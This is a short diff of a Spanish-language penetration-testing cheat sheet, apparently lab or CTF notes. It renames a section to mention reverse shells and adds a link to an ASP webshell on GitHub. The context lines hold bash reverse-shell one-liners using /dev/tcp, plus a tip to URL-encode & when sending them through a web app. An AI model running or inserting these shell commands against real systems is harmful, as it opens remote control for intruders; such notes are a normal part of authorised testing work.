@@ -1445,7 +1445,7 @@ stty rows  51 columns 189 # Patalla grande
 stty rows  40 columns 167 # pantalla de lab viejita
 ```
 
-## Spawn shells
+## Spawn shells ( reverse shell)
 
 Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia el & por %26 
 
@@ -1459,6 +1459,10 @@ bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
 bash -c 'bash -i >& /dev/tcp/IP/port 0>&1'
 
 ```
+## asp shell
+
+> https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
+
 ***ASP*** simple shell
 
 ```
